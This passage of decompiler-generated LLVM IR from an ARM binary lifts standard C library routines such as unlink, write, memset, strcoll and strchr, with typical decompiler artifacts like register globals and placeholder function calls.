  %v0_aa20 = phi i32 [ %v2_aa00, %entry ], [ -1, %dec_label_pc_aa10 ]
  %v2_aa24 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_aa24, i32* @r4, align 4
  ret i32 %v0_aa20

; uselistorder directives
  uselistorder i32 %v2_aa00, { 1, 0, 2 }
  uselistorder label %dec_label_pc_aa20, { 1, 0 }
}

define i32 @unlink() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_aa28 = load i32, i32* @r4, align 4
  store i32 %v3_aa28, i32* %stack_var_-8, align 4
  %v0_aa2c = call i32 @unlink()
  store i32 %v0_aa2c, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_aa2c, -4095
  br i1 %tmp, label %dec_label_pc_aa4c, label %dec_label_pc_aa3c

dec_label_pc_aa3c:                                ; preds = %entry
  %v0_aa3c = call i32 @__errno_location()
  %v0_aa40 = load i32, i32* %r4.global-to-local, align 4
  %v1_aa40 = sub i32 0, %v0_aa40
  %v2_aa44 = inttoptr i32 %v0_aa3c to i32*
  store i32 %v1_aa40, i32* %v2_aa44, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_aa4c

dec_label_pc_aa4c:                                ; preds = %entry, %dec_label_pc_aa3c
  %v0_aa4c = phi i32 [ %v0_aa2c, %entry ], [ -1, %dec_label_pc_aa3c ]
  %v2_aa50 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_aa50, i32* @r4, align 4
  ret i32 %v0_aa4c

; uselistorder directives
  uselistorder i32 %v0_aa2c, { 1, 0, 2 }
  uselistorder i32 ()* @unlink, { 1, 0 }
  uselistorder label %dec_label_pc_aa4c, { 1, 0 }
}

define i32 @__libc_waitpid(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v0_aa58 = call i32 @wait4()
  ret i32 %v0_aa58
}

define i32 @__libc_write(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_aa5c = load i32, i32* @r4, align 4
  store i32 %v3_aa5c, i32* %stack_var_-8, align 4
  %v3_aa60 = load i32, i32* @r2, align 4
  %v4_aa60 = call i32 @write(i32 %arg1, i32* %arg2, i32 %v3_aa60)
  store i32 %v4_aa60, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v4_aa60, -4095
  br i1 %tmp, label %dec_label_pc_aa80, label %dec_label_pc_aa70

dec_label_pc_aa70:                                ; preds = %entry
  %v0_aa70 = call i32 @__errno_location()
  %v0_aa74 = load i32, i32* %r4.global-to-local, align 4
  %v1_aa74 = sub i32 0, %v0_aa74
  %v2_aa78 = inttoptr i32 %v0_aa70 to i32*
  store i32 %v1_aa74, i32* %v2_aa78, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_aa80

dec_label_pc_aa80:                                ; preds = %entry, %dec_label_pc_aa70
  %v0_aa80 = phi i32 [ %v4_aa60, %entry ], [ -1, %dec_label_pc_aa70 ]
  %v2_aa84 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_aa84, i32* @r4, align 4
  ret i32 %v0_aa80

; uselistorder directives
  uselistorder i32 %v4_aa60, { 1, 0, 2 }
  uselistorder label %dec_label_pc_aa80, { 1, 0 }
}

define i32 @__GI_toupper(i32 %arg1) local_unnamed_addr {
entry:
  %v1_aa90 = icmp slt i32 %arg1, 0
  br i1 %v1_aa90, label %bb, label %bb1

bb:                                               ; preds = %entry
  ret i32 %arg1

bb1:                                              ; preds = %entry
  %v2_aa90 = mul i32 %arg1, 2
  %v2_aa9c = load i32, i32* @global_var_1b51c, align 4
  %v2_aaa0 = add i32 %v2_aa9c, %v2_aa90
  %v3_aaa4 = inttoptr i32 %v2_aaa0 to i8*
  %v4_aaa4 = load i8, i8* %v3_aaa4, align 1
  %v6_aaa4 = zext i8 %v4_aaa4 to i32
  %v1_aaa8 = add i32 %v2_aaa0, 1
  %v2_aaa8 = inttoptr i32 %v1_aaa8 to i8*
  %v3_aaa8 = load i8, i8* %v2_aaa8, align 1
  %v4_aaa8 = zext i8 %v3_aaa8 to i32
  %v3_aaac = mul nuw i32 %v4_aaa8, 16777216
  %v4_aab0 = sdiv i32 %v3_aaac, 65536
  %v5_aab0 = or i32 %v4_aab0, %v6_aaa4
  ret i32 %v5_aab0

; uselistorder directives
  uselistorder i32 %v2_aaa0, { 1, 0 }
}

define i32 @__errno_location() local_unnamed_addr {
entry:
  ret i32 ptrtoint (i32* @global_var_1bac8.75 to i32)
}

define i32 @clock() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %v0_aad4 = call i32 @times()
  %v2_aae0 = add i32 %tmp3, %tmp
  %v2_aae8 = mul i32 %v2_aae0, 10000
  %v1_aaec = and i32 %v2_aae8, 2147483632
  ret i32 %v1_aaec
}

define i32 @"$d.3"(i32 %arg1) local_unnamed_addr {
dec_label_pc_aaf8:
  %v0_aaf8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_aaf8, label %bb, label %bb1

bb:                                               ; preds = %dec_label_pc_aaf8
  br label %bb1

bb1:                                              ; preds = %dec_label_pc_aaf8, %bb
  ret i32 %arg1

; uselistorder directives
  uselistorder label %bb1, { 1, 0 }
}

define i32 @bcopy(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v2_ab0c = inttoptr i32 %arg2 to i8*
  %v3_ab0c = call i32 @_memcpy(i8* %v2_ab0c, i32 %arg1)
  ret i32 %v3_ab0c
}

define i32 @memcpy() local_unnamed_addr {
entry:
  %v0_ab10 = load i32, i32* @r0, align 4
  %v1_ab10 = load i32, i32* @r1, align 4
  %v2_ab10 = inttoptr i32 %v0_ab10 to i8*
  %v3_ab10 = call i32 @_memcpy(i8* %v2_ab10, i32 %v1_ab10)
  ret i32 %v3_ab10
}

define i32 @__GI_memset(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v0_ab24 = load i32, i32* @r2, align 4
  %v8_ab24 = icmp eq i32 %v0_ab24, 8
  store i1 %v8_ab24, i1* %cpsr_z.global-to-local, align 1
  %v5_ab28 = icmp slt i32 %v0_ab24, 8
  br i1 %v5_ab28, label %dec_label_pc_ab88, label %dec_label_pc_ab2c

dec_label_pc_ab2c:                                ; preds = %entry
  %v4_ab2c = mul i32 %arg2, 256
  %v5_ab2c = or i32 %v4_ab2c, %arg2
  %v4_ab30 = mul i32 %v5_ab2c, 65536
  %v5_ab30 = or i32 %v4_ab30, %v5_ab2c
  store i32 %v5_ab30, i32* %r1.global-to-local, align 4
  %v1_ab3457 = urem i32 %tmp, 4
  %v2_ab3458 = icmp eq i32 %v1_ab3457, 0
  store i1 %v2_ab3458, i1* %cpsr_z.global-to-local, align 1
  %extract.t83 = trunc i32 %arg2 to i8
  br i1 %v2_ab3458, label %dec_label_pc_ab44, label %bb

bb:                                               ; preds = %dec_label_pc_ab2c, %.thread.bb_crit_edge
  %arg2.sink.off0 = phi i8 [ %extract.t82, %.thread.bb_crit_edge ], [ %extract.t83, %dec_label_pc_ab2c ]
  %v3_ab3859 = phi i32 [ %v6_ab38, %.thread.bb_crit_edge ], [ %tmp, %dec_label_pc_ab2c ]
  %v4_ab38 = inttoptr i32 %v3_ab3859 to i8*
  store i8 %arg2.sink.off0, i8* %v4_ab38, align 1
  %v5_ab38 = load i32, i32* %r3.global-to-local, align 4
  %v6_ab38 = add i32 %v5_ab38, 1
  store i32 %v6_ab38, i32* %r3.global-to-local, align 4
  %v0_ab3c.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  %v0_ab48.pr.pre = load i32, i32* @r2, align 4
  br i1 %v0_ab3c.pr, label %dec_label_pc_ab44, label %.thread

.thread:                                          ; preds = %bb
  %v2_ab3c = add i32 %v0_ab48.pr.pre, -1
  store i32 %v2_ab3c, i32* @r2, align 4
  %v1_ab34 = urem i32 %v6_ab38, 4
  %v2_ab34 = icmp eq i32 %v1_ab34, 0
  store i1 %v2_ab34, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ab34, label %dec_label_pc_ab44, label %.thread.bb_crit_edge

.thread.bb_crit_edge:                             ; preds = %.thread
  %v1_ab38.pre = load i32, i32* %r1.global-to-local, align 4
  %extract.t82 = trunc i32 %v1_ab38.pre to i8
  br label %bb

dec_label_pc_ab44:                                ; preds = %.thread, %bb, %dec_label_pc_ab2c
  %v0_ab5028 = phi i32 [ %tmp, %dec_label_pc_ab2c ], [ %v6_ab38, %bb ], [ %v6_ab38, %.thread ]
  %v0_ab48.pr = phi i32 [ %v0_ab24, %dec_label_pc_ab2c ], [ %v0_ab48.pr.pre, %bb ], [ %v2_ab3c, %.thread ]
  %v0_ab44 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_ab44, i32* @ip, align 4
  %v8_ab4810 = icmp eq i32 %v0_ab48.pr, 8
  store i1 %v8_ab4810, i1* %cpsr_z.global-to-local, align 1
  %v5_ab4c11 = icmp slt i32 %v0_ab48.pr, 8
  br i1 %v5_ab4c11, label %dec_label_pc_ab88, label %dec_label_pc_ab50.preheader

dec_label_pc_ab50.preheader:                      ; preds = %dec_label_pc_ab44
  %v1_ab5046 = inttoptr i32 %v0_ab5028 to i32*
  store i32 %v0_ab44, i32* %v1_ab5046, align 4
  %v3_ab5047 = add i32 %v0_ab5028, 4
  %v4_ab5048 = inttoptr i32 %v3_ab5047 to i32*
  %v5_ab5049 = load i32, i32* @ip, align 4
  store i32 %v5_ab5049, i32* %v4_ab5048, align 4
  %v6_ab5050 = add i32 %v0_ab5028, 8
  store i32 %v6_ab5050, i32* %r3.global-to-local, align 4
  %v0_ab5451 = load i32, i32* @r2, align 4
  %v1_ab5452 = add i32 %v0_ab5451, -8
  store i32 %v1_ab5452, i32* %r2.global-to-local, align 4
  %v5_ab5c53 = icmp slt i32 %v1_ab5452, 8
  br i1 %v5_ab5c53, label %dec_label_pc_ab50.dec_label_pc_ab88.loopexit_crit_edge, label %dec_label_pc_ab60

dec_label_pc_ab60:                                ; preds = %dec_label_pc_ab50.preheader, %dec_label_pc_ab48.dec_label_pc_ab50_crit_edge
  %v6_ab5055 = phi i32 [ %v6_ab50, %dec_label_pc_ab48.dec_label_pc_ab50_crit_edge ], [ %v6_ab5050, %dec_label_pc_ab50.preheader ]
  %v0_ab5054 = phi i32 [ %v12_ab7c, %dec_label_pc_ab48.dec_label_pc_ab50_crit_edge ], [ %v0_ab5028, %dec_label_pc_ab50.preheader ]
  %v1_ab60 = inttoptr i32 %v6_ab5055 to i32*
  %v2_ab60 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v2_ab60, i32* %v1_ab60, align 4
  %v3_ab60 = add i32 %v0_ab5054, 12
  %v4_ab60 = inttoptr i32 %v3_ab60 to i32*
  %v5_ab60 = load i32, i32* @ip, align 4
  store i32 %v5_ab60, i32* %v4_ab60, align 4
  %v6_ab60 = add i32 %v0_ab5054, 16
  store i32 %v6_ab60, i32* %r3.global-to-local, align 4
  %v0_ab64 = load i32, i32* %r2.global-to-local, align 4
  %v1_ab64 = add i32 %v0_ab64, -8
  store i32 %v1_ab64, i32* %r2.global-to-local, align 4
  %v5_ab6c = icmp slt i32 %v1_ab64, 8
  br i1 %v5_ab6c, label %dec_label_pc_ab60.dec_label_pc_ab88.loopexit_crit_edge, label %dec_label_pc_ab70

dec_label_pc_ab70:                                ; preds = %dec_label_pc_ab60
  %v1_ab70 = inttoptr i32 %v6_ab60 to i32*
  %v2_ab70 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v2_ab70, i32* %v1_ab70, align 4
  %v3_ab70 = add i32 %v0_ab5054, 20
  %v4_ab70 = inttoptr i32 %v3_ab70 to i32*
  %v5_ab70 = load i32, i32* @ip, align 4
  store i32 %v5_ab70, i32* %v4_ab70, align 4
  %v6_ab70 = add i32 %v0_ab5054, 24
  store i32 %v6_ab70, i32* %r3.global-to-local, align 4
  %v0_ab74 = load i32, i32* %r2.global-to-local, align 4
  %v1_ab74 = add i32 %v0_ab74, -8
  store i32 %v1_ab74, i32* %r2.global-to-local, align 4
  %v5_ab7c = icmp slt i32 %v1_ab74, 8
  br i1 %v5_ab7c, label %dec_label_pc_ab70.dec_label_pc_ab88.loopexit_crit_edge, label %dec_label_pc_ab48

dec_label_pc_ab48:                                ; preds = %dec_label_pc_ab70
  %v7_ab7c = inttoptr i32 %v6_ab70 to i32*
  %v8_ab7c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v8_ab7c, i32* %v7_ab7c, align 4
  %v9_ab7c = add i32 %v0_ab5054, 28
  %v10_ab7c = inttoptr i32 %v9_ab7c to i32*
  %v11_ab7c = load i32, i32* @ip, align 4
  store i32 %v11_ab7c, i32* %v10_ab7c, align 4
  %v12_ab7c = add i32 %v0_ab5054, 32
  store i32 %v12_ab7c, i32* %r3.global-to-local, align 4
  %v6_ab80 = load i32, i32* %r2.global-to-local, align 4
  %v7_ab80 = add i32 %v6_ab80, -8
  store i32 %v7_ab80, i32* %r2.global-to-local, align 4
  %v5_ab4c = icmp slt i32 %v7_ab80, 8
  br i1 %v5_ab4c, label %dec_label_pc_ab48.dec_label_pc_ab88.loopexit_crit_edge, label %dec_label_pc_ab48.dec_label_pc_ab50_crit_edge

dec_label_pc_ab48.dec_label_pc_ab50_crit_edge:    ; preds = %dec_label_pc_ab48
  %v2_ab50.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_ab50 = inttoptr i32 %v12_ab7c to i32*
  store i32 %v2_ab50.pre, i32* %v1_ab50, align 4
  %v3_ab50 = add i32 %v0_ab5054, 36
  %v4_ab50 = inttoptr i32 %v3_ab50 to i32*
  %v5_ab50 = load i32, i32* @ip, align 4
  store i32 %v5_ab50, i32* %v4_ab50, align 4
  %v6_ab50 = add i32 %v0_ab5054, 40
  store i32 %v6_ab50, i32* %r3.global-to-local, align 4
  %v0_ab54 = load i32, i32* %r2.global-to-local, align 4
  %v1_ab54 = add i32 %v0_ab54, -8
  store i32 %v1_ab54, i32* %r2.global-to-local, align 4
  %v5_ab5c = icmp slt i32 %v1_ab54, 8
  br i1 %v5_ab5c, label %dec_label_pc_ab50.dec_label_pc_ab88.loopexit_crit_edge, label %dec_label_pc_ab60

dec_label_pc_ab50.dec_label_pc_ab88.loopexit_crit_edge: ; preds = %dec_label_pc_ab48.dec_label_pc_ab50_crit_edge, %dec_label_pc_ab50.preheader
  %v1_ab54.lcssa = phi i32 [ %v1_ab5452, %dec_label_pc_ab50.preheader ], [ %v1_ab54, %dec_label_pc_ab48.dec_label_pc_ab50_crit_edge ]
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_ab88

dec_label_pc_ab48.dec_label_pc_ab88.loopexit_crit_edge: ; preds = %dec_label_pc_ab48
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_ab88

dec_label_pc_ab60.dec_label_pc_ab88.loopexit_crit_edge: ; preds = %dec_label_pc_ab60
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_ab88

dec_label_pc_ab70.dec_label_pc_ab88.loopexit_crit_edge: ; preds = %dec_label_pc_ab70
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_ab88

dec_label_pc_ab88:                                ; preds = %dec_label_pc_ab44, %dec_label_pc_ab50.dec_label_pc_ab88.loopexit_crit_edge, %dec_label_pc_ab48.dec_label_pc_ab88.loopexit_crit_edge, %dec_label_pc_ab60.dec_label_pc_ab88.loopexit_crit_edge, %dec_label_pc_ab70.dec_label_pc_ab88.loopexit_crit_edge, %entry
  %v0_ab90 = phi i32 [ %v0_ab24, %entry ], [ %v1_ab74, %dec_label_pc_ab70.dec_label_pc_ab88.loopexit_crit_edge ], [ %v1_ab64, %dec_label_pc_ab60.dec_label_pc_ab88.loopexit_crit_edge ], [ %v7_ab80, %dec_label_pc_ab48.dec_label_pc_ab88.loopexit_crit_edge ], [ %v1_ab54.lcssa, %dec_label_pc_ab50.dec_label_pc_ab88.loopexit_crit_edge ], [ %v0_ab48.pr, %dec_label_pc_ab44 ]
  %v2_ab88 = icmp eq i32 %v0_ab90, 0
  store i1 %v2_ab88, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ab88, label %bb32, label %bb33

bb32:                                             ; preds = %dec_label_pc_ab88
  ret i32 %tmp

bb33:                                             ; preds = %dec_label_pc_ab88
  %v1_ab90 = sub i32 7, %v0_ab90
  store i32 %v1_ab90, i32* %r2.global-to-local, align 4
  %v3_ab94 = mul i32 %v1_ab90, 4
  %v4_ab94 = add i32 %v3_ab94, ptrtoint (i32* @global_var_ab9c.77 to i32)
  call void @__pseudo_branch(i32 %v4_ab94)
  %v0_ab9c = load i32, i32* %r1.global-to-local, align 4
  %v1_ab9c = trunc i32 %v0_ab9c to i8
  %v2_ab9c = load i32, i32* %r3.global-to-local, align 4
  %v3_ab9c = inttoptr i32 %v2_ab9c to i8*
  store i8 %v1_ab9c, i8* %v3_ab9c, align 1
  %v4_ab9c = load i32, i32* %r3.global-to-local, align 4
  %v5_ab9c = add i32 %v4_ab9c, 1
  store i32 %v5_ab9c, i32* %r3.global-to-local, align 4
  %v0_aba0 = load i32, i32* %r1.global-to-local, align 4
  %v1_aba0 = trunc i32 %v0_aba0 to i8
  %v3_aba0 = inttoptr i32 %v5_ab9c to i8*
  store i8 %v1_aba0, i8* %v3_aba0, align 1
  %v4_aba0 = load i32, i32* %r3.global-to-local, align 4
  %v5_aba0 = add i32 %v4_aba0, 1
  store i32 %v5_aba0, i32* %r3.global-to-local, align 4
  %v0_aba4 = load i32, i32* %r1.global-to-local, align 4
  %v1_aba4 = trunc i32 %v0_aba4 to i8
  %v3_aba4 = inttoptr i32 %v5_aba0 to i8*
  store i8 %v1_aba4, i8* %v3_aba4, align 1
  %v4_aba4 = load i32, i32* %r3.global-to-local, align 4
  %v5_aba4 = add i32 %v4_aba4, 1
  store i32 %v5_aba4, i32* %r3.global-to-local, align 4
  %v0_aba8 = load i32, i32* %r1.global-to-local, align 4
  %v1_aba8 = trunc i32 %v0_aba8 to i8
  %v3_aba8 = inttoptr i32 %v5_aba4 to i8*
  store i8 %v1_aba8, i8* %v3_aba8, align 1
  %v4_aba8 = load i32, i32* %r3.global-to-local, align 4
  %v5_aba8 = add i32 %v4_aba8, 1
  store i32 %v5_aba8, i32* %r3.global-to-local, align 4
  %v0_abac = load i32, i32* %r1.global-to-local, align 4
  %v1_abac = trunc i32 %v0_abac to i8
  %v3_abac = inttoptr i32 %v5_aba8 to i8*
  store i8 %v1_abac, i8* %v3_abac, align 1
  %v4_abac = load i32, i32* %r3.global-to-local, align 4
  %v5_abac = add i32 %v4_abac, 1
  store i32 %v5_abac, i32* %r3.global-to-local, align 4
  %v0_abb0 = load i32, i32* %r1.global-to-local, align 4
  %v1_abb0 = trunc i32 %v0_abb0 to i8
  %v3_abb0 = inttoptr i32 %v5_abac to i8*
  store i8 %v1_abb0, i8* %v3_abb0, align 1
  %v4_abb0 = load i32, i32* %r3.global-to-local, align 4
  %v5_abb0 = add i32 %v4_abb0, 1
  store i32 %v5_abb0, i32* %r3.global-to-local, align 4
  %v0_abb4 = load i32, i32* %r1.global-to-local, align 4
  %v1_abb4 = trunc i32 %v0_abb4 to i8
  %v3_abb4 = inttoptr i32 %v5_abb0 to i8*
  store i8 %v1_abb4, i8* %v3_abb4, align 1
  %v4_abb4 = load i32, i32* %r3.global-to-local, align 4
  %v5_abb4 = add i32 %v4_abb4, 1
  store i32 %v5_abb4, i32* %r3.global-to-local, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v6_ab50, { 1, 0 }
  uselistorder i32 %v12_ab7c, { 1, 2, 0 }
  uselistorder i32 %v0_ab5054, { 0, 1, 7, 6, 5, 4, 3, 2 }
  uselistorder i32 %v0_ab48.pr, { 0, 2, 1 }
  uselistorder i32 %v6_ab38, { 2, 3, 0, 4, 1 }
  uselistorder i32 %v5_ab2c, { 1, 0 }
  uselistorder i32 %v0_ab24, { 1, 0, 2, 3 }
  uselistorder i32 %tmp, { 3, 4, 2, 1, 0, 5 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 19, 20, 17, 14, 15, 16, 13, 18, 21, 22 }
  uselistorder i32* %r2.global-to-local, { 1, 9, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 1, 10, 11, 12, 13, 9, 14, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 8, 7, 9, 6, 2, 4, 3, 0, 5 }
  uselistorder i32 %arg2, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_ab88, { 4, 3, 2, 1, 0, 5 }
  uselistorder label %dec_label_pc_ab60, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @__GI_strcoll(i8* %arg1, i32 %arg2) local_unnamed_addr {
bb:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_abc4.pre = load i32, i32* @r1, align 4
  br label %entry

entry:                                            ; preds = %bb3, %bb
  %v0_abc4 = phi i32 [ %v0_abc4.pre, %bb ], [ %v5_abc4, %bb3 ]
  %v0_abc0 = phi i32 [ %tmp, %bb ], [ %v5_abc0, %bb3 ]
  %v1_abc0 = inttoptr i32 %v0_abc0 to i8*
  %v2_abc0 = load i8, i8* %v1_abc0, align 1
  %v1_abc4 = inttoptr i32 %v0_abc4 to i8*
  %v2_abc4 = load i8, i8* %v1_abc4, align 1
  %v3_abc4 = zext i8 %v2_abc4 to i32
  %v2_abc8 = icmp eq i8 %v2_abc0, 0
  br i1 %v2_abc8, label %.dec_label_pc_abd4_crit_edge, label %bb3

bb3:                                              ; preds = %entry
  %v5_abc4 = add i32 %v0_abc4, 1
  %v5_abc0 = add i32 %v0_abc0, 1
  %v3_abc0 = zext i8 %v2_abc0 to i32
  %v10_abcc = icmp eq i8 %v2_abc0, %v2_abc4
  br i1 %v10_abcc, label %entry, label %dec_label_pc_abd4

.dec_label_pc_abd4_crit_edge:                     ; preds = %entry
  br label %dec_label_pc_abd4

dec_label_pc_abd4:                                ; preds = %bb3, %.dec_label_pc_abd4_crit_edge
  %.pn = phi i32 [ 0, %.dec_label_pc_abd4_crit_edge ], [ %v3_abc0, %bb3 ]
  %v2_abd4.pre-phi = sub nsw i32 %.pn, %v3_abc4
  ret i32 %v2_abd4.pre-phi

; uselistorder directives
  uselistorder i8 %v2_abc0, { 0, 2, 1 }
  uselistorder i32 %v0_abc0, { 1, 0 }
  uselistorder i32 %v0_abc4, { 1, 0 }
  uselistorder label %dec_label_pc_abd4, { 1, 0 }
}

declare i32 @strlen(i8*) local_unnamed_addr

define i32 @__GI_strchr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v6_ac40 = load i32, i32* @r5, align 4
  %v9_ac40 = load i32, i32* @r6, align 4
  %v1_ac44 = urem i32 %arg1, 256
  br label %dec_label_pc_ac64

dec_label_pc_ac4c:                                ; preds = %dec_label_pc_ac64
  %v3_ac4c = load i8, i8* %.0, align 1
  %v4_ac4c = zext i8 %v3_ac4c to i32
  %v9_ac50 = icmp eq i32 %v4_ac4c, %v1_ac44
  br i1 %v9_ac50, label %bb, label %bb24

bb:                                               ; preds = %dec_label_pc_ac4c
  ret i32 %v1_ac64

bb24:                                             ; preds = %dec_label_pc_ac4c
  %v2_ac58 = icmp eq i8 %v3_ac4c, 0
  %v2_ac5c = add i32 %v1_ac64, 1
  %v3_ac5c = inttoptr i32 %v2_ac5c to i8*
  br i1 %v2_ac58, label %dec_label_pc_ad38, label %dec_label_pc_ac64

dec_label_pc_ac64:                                ; preds = %bb24, %entry
  %.0 = phi i8* [ undef, %entry ], [ %v3_ac5c, %bb24 ]
  %v1_ac64 = ptrtoint i8* %.0 to i32
  %v2_ac64 = urem i32 %v1_ac64, 4
  %v3_ac64 = icmp eq i32 %v2_ac64, 0
  br i1 %v3_ac64, label %dec_label_pc_ac6c, label %dec_label_pc_ac4c

dec_label_pc_ac6c:                                ; preds = %dec_label_pc_ac64
  %v4_ac6c = mul nuw nsw i32 %v1_ac44, 256
  %v5_ac6c = or i32 %v4_ac6c, %v1_ac44
  %v4_ac74 = mul i32 %v5_ac6c, 65536
  %v5_ac74 = or i32 %v4_ac74, %v5_ac6c
  br label %dec_label_pc_ac78

dec_label_pc_ac78:                                ; preds = %dec_label_pc_ad30, %dec_label_pc_acb8, %dec_label_pc_ac6c
  %v0_acdc = phi i32 [ %v1_ac64, %dec_label_pc_ac6c ], [ %v4_ac78, %dec_label_pc_acb8 ], [ %v4_ac78, %dec_label_pc_ad30 ]
  %v1_ac78 = inttoptr i32 %v0_acdc to i32*
  %v2_ac78 = load i32, i32* %v1_ac78, align 4
  %v4_ac78 = add i32 %v0_acdc, 4
  %v2_ac80 = xor i32 %v2_ac78, %v5_ac74
  %v2_ac8c = add i32 %v2_ac78, 2130640639
  %v1_ac90 = sub i32 -1, %v2_ac78
  %v2_ac94 = xor i32 %v2_ac8c, %v1_ac90
  %v2_ac98 = add i32 %v2_ac80, 2130640639
  %v1_aca0 = sub i32 -1, %v2_ac80
  %v2_aca4 = and i32 %v2_ac94, -2130640640
  %v2_aca8 = xor i32 %v2_ac98, %v1_aca0
  %v2_acac = icmp eq i32 %v2_aca4, 0
  %v2_acb0 = and i32 %v2_aca8, -2130640640
  store i32 %v2_acb0, i32* @lr, align 4
  br i1 %v2_acac, label %dec_label_pc_acb8, label %dec_label_pc_acc0

dec_label_pc_acb8:                                ; preds = %dec_label_pc_ac78
  %v2_acb8 = icmp eq i32 %v2_acb0, 0
  br i1 %v2_acb8, label %dec_label_pc_ac78, label %dec_label_pc_acc0

dec_label_pc_acc0:                                ; preds = %dec_label_pc_ac78, %dec_label_pc_acb8
  %v2_acc0 = inttoptr i32 %v0_acdc to i8*
  %v3_acc0 = load i8, i8* %v2_acc0, align 1
  %v4_acc0 = zext i8 %v3_acc0 to i32
  %v1_acc8 = add i32 %v0_acdc, 1
  %v1_accc = add i32 %v0_acdc, 2
  %v9_acd0 = icmp eq i32 %v4_acc0, %v1_ac44
  %v1_acd4 = add i32 %v0_acdc, 3
  store i32 %v1_acd4, i32* @ip, align 4
  br i1 %v9_acd0, label %dec_label_pc_acdc, label %dec_label_pc_ace4

dec_label_pc_acdc:                                ; preds = %dec_label_pc_acc0
  store i32 %v6_ac40, i32* @r5, align 4
  store i32 %v9_ac40, i32* @r6, align 4
  ret i32 %v0_acdc

dec_label_pc_ace4:                                ; preds = %dec_label_pc_acc0
  %v2_ace4 = icmp eq i8 %v3_acc0, 0
  br i1 %v2_ace4, label %dec_label_pc_ad38, label %dec_label_pc_acec

dec_label_pc_acec:                                ; preds = %dec_label_pc_ace4
  %v2_acec = inttoptr i32 %v1_acc8 to i8*
  %v3_acec = load i8, i8* %v2_acec, align 1
  %v4_acec = zext i8 %v3_acec to i32
  %v9_acf0 = icmp eq i32 %v4_acec, %v1_ac44
  br i1 %v9_acf0, label %bb25, label %bb26

bb25:                                             ; preds = %dec_label_pc_acec
  store i32 %v6_ac40, i32* @r5, align 4
  store i32 %v9_ac40, i32* @r6, align 4
  ret i32 %v1_acc8

bb26:                                             ; preds = %dec_label_pc_acec
  %v2_acf8 = icmp eq i8 %v3_acec, 0
  br i1 %v2_acf8, label %dec_label_pc_ad38, label %dec_label_pc_ad00

dec_label_pc_ad00:                                ; preds = %bb26
  %v2_ad00 = inttoptr i32 %v1_accc to i8*
  %v3_ad00 = load i8, i8* %v2_ad00, align 1
  %v4_ad00 = zext i8 %v3_ad00 to i32
  %v9_ad04 = icmp eq i32 %v4_ad00, %v1_ac44
  br i1 %v9_ad04, label %dec_label_pc_ad0c, label %dec_label_pc_ad14

dec_label_pc_ad0c:                                ; preds = %dec_label_pc_ad00
  store i32 %v6_ac40, i32* @r5, align 4
  store i32 %v9_ac40, i32* @r6, align 4
  ret i32 %v1_accc

dec_label_pc_ad14:                                ; preds = %dec_label_pc_ad00
  %v2_ad14 = icmp eq i8 %v3_ad00, 0
  br i1 %v2_ad14, label %dec_label_pc_ad38, label %dec_label_pc_ad1c

dec_label_pc_ad1c:                                ; preds = %dec_label_pc_ad14
  %v2_ad1c = inttoptr i32 %v1_acd4 to i8*
  %v3_ad1c = load i8, i8* %v2_ad1c, align 1
  %v4_ad1c = zext i8 %v3_ad1c to i32
  %v9_ad20 = icmp eq i32 %v4_ad1c, %v1_ac44
  br i1 %v9_ad20, label %dec_label_pc_ad28, label %dec_label_pc_ad30

dec_label_pc_ad28:                                ; preds = %dec_label_pc_ad1c
  store i32 %v6_ac40, i32* @r5, align 4
  store i32 %v9_ac40, i32* @r6, align 4
  ret i32 %v1_acd4

dec_label_pc_ad30:                                ; preds = %dec_label_pc_ad1c
  %v2_ad30 = icmp eq i8 %v3_ad1c, 0
  br i1 %v2_ad30, label %dec_label_pc_ad38, label %dec_label_pc_ac78

dec_label_pc_ad38:                                ; preds = %bb24, %dec_label_pc_ad30, %dec_label_pc_ad14, %bb26, %dec_label_pc_ace4
  store i32 %v6_ac40, i32* @r5, align 4
  store i32 %v9_ac40, i32* @r6, align 4
  ret i32 0

; uselistorder directives
